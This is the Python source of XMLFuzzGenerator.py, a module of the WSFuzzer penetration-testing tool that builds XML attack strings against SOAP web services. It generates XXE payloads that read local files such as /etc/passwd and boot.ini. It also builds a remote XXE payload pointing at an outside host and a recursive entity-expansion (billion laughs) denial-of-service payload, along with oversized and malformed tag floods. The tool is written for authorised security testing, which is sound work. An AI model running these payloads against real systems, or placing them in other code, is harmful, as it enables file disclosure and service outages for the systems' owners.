"""
# Web Services Fuzzer
#
# FILENAME      : XMLFuzzGenerator.py
# AUTHORS       : Andres Andreu <andres [at] neurofuzz dot com>
# DATE          : 4/26/2006
# LAST UPDATE   : 8/29/2010
# ABSTRACT      : A library to dynamically generate XML content fuzzing attack strings.
#               : This tool is meant to be part of a web app pen testers toolkit.
#
# Copyright (c) 2006 - 2010 neuroFuzz, LLC
# Get the latest versions from:
# http://www.neurofuzz.com
#
# This program is distributed in the hope that it will be useful
# to the application security community.  It is in no way written
# to be used for malicious purposes and the target audience are
# penetration testers who have all legal right to perform these
# types of audits against a given target.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
# This file is part of WSFuzzer.
#
# WSFuzzer is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# WSFuzzer is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with WSFuzzer. It is in a file named LICENSE.
# If not, see <http://www.gnu.org/licenses/>
"""

from StringIO import StringIO

from inc import attackUtils
import attackTags
import WSSEAttackGenerator

class XMLFuzzGenerator:
    def __init__(self):
        self.cdatastatic = []
        self.tags = []
        self.entities = []
        self.wssecurity = []
        self.xml = {}
        self.getTags()
        self.remoteAttackHost = "http://sec.neurofuzz-software.com/e4589efff654d91e26b43333dbf41425/"

    # NAME     : getTags
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : Populates dictionary for baseline static XML tags
    def getTags(self):
        self.xml = attackTags.AttackTagGenerator().getTags()
	# EOF: getTags

    # NAME     : addstring
    # PARAMS   : data, datatype
    # RETURN   : Nothing
    # DESC     : Populates array respective to the
    #			datatype submitted
    def addstring(self, data, datatype):
        if datatype == "static":
            self.cdatastatic.append([data, "XML Content Attack"])
        elif datatype == "tags":
            self.tags.append([data, "XML Content Attack"])
        elif datatype == "entity":
            self.entities.append([data, "XML eXternal Entity"])
        else:
            print "??? - Unknown datatype"
	# EOF: addstring

    # NAME     : genOpenWSSEXML
    # PARAMS   : None
    # RETURN   : string
    # DESC     : Generates XML header and open XML tags
    #			for the envelope, header, wsse sec,
    #			and userNameToken
    def genOpenWSSEXML(self):
        return self.xml["xh"] + self.xml["env_open"] + self.xml["header_open"] + self.xml["sec_open"] + self.xml["ut_open"]
	# EOF: genOpenWSSEXML

    # NAME     : genMidWSSEXML
    # PARAMS   : None
    # RETURN   : string
    # DESC     : Generates middle XML tags.  This includes
    #			close tags for the userNameToken, wsse sec,
    #			and header.  Then it opens up the body tag.
    def genMidWSSEXML(self):
        return self.xml["ut_close"] + self.xml["sec_close"] + self.xml["header_close"] + self.xml["body_open"]
	# EOF: genMidWSSEXML

    # NAME     : genCloseWSSEXML
    # PARAMS   : None
    # RETURN   : string
    # DESC     : Generates closing XML tags for the body & envelope
    def genCloseWSSEXML(self):
        return self.xml["body_close"] + self.xml["env_close"]
	# EOF: genCloseWSSEXML

    # NAME     : generateXMLFuzzData
    # PARAMS   : string, endsize, increment, datatype, startsize
    # RETURN   : Nothing
    # DESC     : Generates fuzz data based on the parameters
    #			passed in.
    def generateXMLFuzzData(self, string, endsize, increment, datatype, startsize=0):
        if startsize:
            x = startsize
        else:
            x = increment
        while x <= endsize:
            y = string * x
            self.addstring(y, datatype)
            x += increment
	# EOF: generateXMLFuzzData

    # NAME     : generateAttacks
    # PARAMS   : list, param
    # RETURN   : Nothing
    # DESC     : Wrapper function that calls all the other
    #			functions that will generate attack strings
    def generateAttacks(self, list, param):
        if param:
            print "For parameter: %s" % param
        print "Generating Element Attacks ...",
        self.generateTagAttacks(param)
        print "Done\vGenerating random XML garbage ...",
        self.generateXMLGarbage()
        print "Done\n"
	# EOF: generateAttacks

    # NAME     : generateXXEAttacks
    # PARAMS   : method, params
    # RETURN   : Nothing
    # DESC     : Wrapper function that calls all the other
    #			functions that will generate XXE attack XML
    #			uses time.sleep since randomness is based on
    #			sys time, we dont want to be predictable &-)
    def generateXXEAttacks(self, method=None, params=None):
        self.attacks = ('file://c:/boot.ini', 'file:///etc/passwd', 'file:///dev/random')
        self.remoteattacks = ('phpinfo.txt', 'sometext.txt')
        print "Generating XXE Methods ...",
        self.generateXXEMethod(method)
        self.generateXXEMethod(method, params)
        self.generateRemoteXXEMethod(method)
        print "Done\vGenerating Generic XXE Attacks ...",
        self.generateGenericXXE()
        print "Done\vGenerating OS specific XXE Attacks ...",
        self.generateOSXXE()
        print "Done\n"
	# EOF: generateXXEAttacks

	# NAME     : generateWSSEAttacks
    # PARAMS   : list
    # RETURN   : Nothing
    # DESC     : Wrapper function that calls all the other
    #			functions that will generate WSSE attack XML
    #			uses time.sleep since randomness is based on
    #			sys time, we dont want to be predictable &-)
    def generateWSSEAttacks(self, method=None, params=None):
        w = WSSEAttackGenerator.WSSEAttackGenerator().generateWSSEAttacks(method, params)
        self.wssecurity = w.getwssecurity()
	# EOF: generateWSSEAttacks

    # NAME     : generateCDATAStatic
    # PARAMS   : static
    # RETURN   : Nothing
    # DESC     : Generates CDATA XML attack data by constructing
    #			strings based on static CDATA tags and the
    #			attack strings passed in via list "static"
    def generateCDATAStatic(self, static):
        for data in static:
            self.addstring("<![CDATA[" + data.strip() + "]]>", 'static')
	# EOF: generateCDATAStatic

    # NAME     : generateTagAttacks
    # PARAMS   : param
    # RETURN   : Nothing
    # DESC     : Generates XML tag attack data by constructing
    #			attack strings based on target parameters
    def generateTagAttacks(self, param):
        rnd = attackUtils.genRandom(200, b64=True)

        final = []
        final.append('<')
        final.append(param)
        final.append('>')
        # generate a bunch of legit looking open tags
        self.generateXMLFuzzData(''.join(final), 256, 64, 'tags')

        final.append('%s</' % rnd)
        final.append(param)
        final.append('>')
        # generate a complete set of legit looking XML tags
        self.generateXMLFuzzData(''.join(final), 256, 64, 'tags')

        # generate a bunch of legit looking close tags
        self.generateXMLFuzzData('</' + param + '>', 256, 64, 'tags')
	# EOF: generateTagAttacks

    # NAME     : generateXMLGarbage
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : Generates XML tag based garbage attack data
    def generateXMLGarbage(self):
        str = gt = gtc = ''
        rnd = attackUtils.genRandom(100, b64=True)
        rnd_tag = attackUtils.genRandom(30, b64=True)
        final = []

        for i in range(101):
            str = str + " a=\"%d\"" % i

        final.append('<%s' % rnd_tag)
        final.append(str)
        final.append('>')

        for i in range(21):
            gt = gt + '<%s>' % rnd_tag
            gtc = gtc + '</%s>' % rnd_tag

        final.append(gt)
        # add an incomplete set of tags here
        self.addstring(''.join(final), 'tags')

        final.append(rnd)
        final.append('\n')
        final.append(gtc)
        final.append('</%s>' % rnd_tag)

        # add the complete XML set of tagged data here
        self.addstring(''.join(final), 'tags')
	# EOF: generateXMLGarbage

    # NAME     : generateGenericXXE
    # PARAMS   : val
    # RETURN   : Nothing
    # DESC     : generates generic XXE XML attack data
    def generateGenericXXE(self, val=101):
        rnd = attackUtils.genRandom(100, b64=True)
        rnd_tag = attackUtils.genRandom(30, b64=True)
        soapStr = StringIO()

        soapStr.write(self.xml["xh"])
        soapStr.write('<!DOCTYPE %s [<!ENTITY x0 \"' % rnd_tag)
        soapStr.write(rnd)
        soapStr.write('\">')

        for i in range(1, val):
            x = i-1
            soapStr.write('<!ENTITY x%s \"&x%s;&x%s;\">' % (i, x, x))

        soapStr.write(']>')
        soapStr.write('<%s>&x%d;</%s>' % (rnd_tag, val-1, rnd_tag))

        self.addstring(soapStr, 'entity')
    # EOF: generateGenericXXE

    # NAME     : generateXXEMethod
    # PARAMS   : method, params
    # RETURN   : Nothing
    # DESC     : generates pseudo random XXE XML attack data
    def generateXXEMethod(self, method, params=[]):
        if method:
            for attack in self.attacks:
                soapStr = StringIO()

                soapStr.write(self.xml["xh"])
                soapStr.write('<!DOCTYPE %s [' % method)
                soapStr.write('<!ELEMENT %s ANY>' % method)
                soapStr.write('<!ENTITY xxe SYSTEM \"%s\">' % attack)
                soapStr.write(']>')

                if params:
                    soapStr.write(self.xml["env_open"] + self.xml["header_open"] +
                                  self.xml["header_close"] + self.xml["body_open"])
                    soapStr.write('<ns1:%s>' % method)
                    for p in params:
                        soapStr.write('<%s>&xxe;</%s>' % (p, p))
                else:
                    soapStr.write('<%s>&xxe;</%s>' % (method, method))

                if params:
                    soapStr.write('</ns1:%s>' % method)
                    soapStr.write(self.xml["body_close"] + self.xml["env_close"])

                self.addstring(soapStr, 'entity')
    # EOF: generateXXEMethod

    # NAME     : generateRemoteXXEMethod
    # PARAMS   : method
    # RETURN   : Nothing
    # DESC     : generates pseudo random XXE XML attack data
    def generateRemoteXXEMethod(self, method):
        if method:
            for attack in self.remoteattacks:
                soapStr = StringIO()

                soapStr.write(self.xml["xh"])
                soapStr.write('<!DOCTYPE %s [' % method)
                soapStr.write('<!ENTITY attack SYSTEM \"%s\">' % (self.remoteAttackHost + attack))
                soapStr.write('<!ELEMENT %s ANY>' % method)
                soapStr.write(']>')

                soapStr.write(self.xml["env_open"] + self.xml["header_open"] + self.xml["header_close"] + self.xml["body_open"])
                soapStr.write('<%s>&attack;</%s>' % (method, method))
                soapStr.write(self.xml["body_close"] + self.xml["env_close"])

                self.addstring(soapStr, 'entity')
    # EOF: generateRemoteXXEMethod

    # NAME     : generateOSXXE
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : generates generic OS based XXE XML attack data
    def generateOSXXE(self):
        for attack in self.attacks:
            rnd_tag = attackUtils.genRandom(30, b64=True)
            soapStr = StringIO()

            soapStr.write(self.xml["xh"])
            soapStr.write('<!DOCTYPE %s [' % rnd_tag)
            soapStr.write('<!ELEMENT %s ANY>' % rnd_tag)
            soapStr.write('<!ENTITY xxe SYSTEM \"%s\">' % attack)
            soapStr.write(']>')
            soapStr.write('<%s>&xxe;</%s>' % (rnd_tag, rnd_tag))

            self.addstring(soapStr, 'entity')
    # EOF: generateOSXXE

    # NAME     : getstatics
    # PARAMS   : None
    # RETURN   : array
    # DESC     : returns array of CDATA based attack string data
    def getstatics(self):
        return self.cdatastatic
    # EOF: getstatics

    # NAME     : gettags
    # PARAMS   : None
    # RETURN   : array
    # DESC     : returns array of tag based attack string data
    def gettags(self):
        return self.tags
    # EOF: gettags

    # NAME     : getentities
    # PARAMS   : None
    # RETURN   : array
    # DESC     : returns array of entity based attack string data
    def getentities(self):
        return self.entities
    # EOF: getentities

    # NAME     : getwssec
    # PARAMS   : None
    # RETURN   : array
    # DESC     : returns array of wsse based attack string data
    def getwssec(self):
        return self.wssecurity
    # EOF: getwssec

    # NAME     : showstatic
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : iterates over array of CDATA based attack
    #			string data printing each element
    def showstatic(self):
        for string in self.cdatastatic:
            print string.replace('><', '>\n<')
    # EOF: showstatic

    # NAME     : showtags
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : iterates over array of tag based attack
    #			string data printing each element
    def showtags(self):
        for string in self.tags:
            print string.replace('><', '>\n<')
    # EOF: showtags

    # NAME     : showentities
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : iterates over array of tag based attack
    #			string data printing each element
    def showentities(self):
        for string in self.entities:
            print string.getvalue().replace('><', '>\n<')
    # EOF: showentities

    # NAME     : showwssec
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : iterates over array of ws-security based
    #			attack string data printing each element
    def showwssec(self):
        for string in self.wssecurity:
            print string.getvalue().replace('><', '>\n<')
    # EOF: showwssec

    # NAME     : showall
    # PARAMS   : None
    # RETURN   : Nothing
    # DESC     : wrapper function that calls all of
    #			the show functions
    def showall(self):
        self.showstatic()
        self.showtags()
        self.showentities()
        self.showwssec()
    # EOF: showall

    # NAME     : getall
    # PARAMS   : None
    # RETURN   : Array
    # DESC     : wrapper function that calls all of
    #			the get functions
    def getallparam(self):
        all = []
        all.append(self.getstatics())
        all.append(self.gettags())

        return all
    # EOF: getall
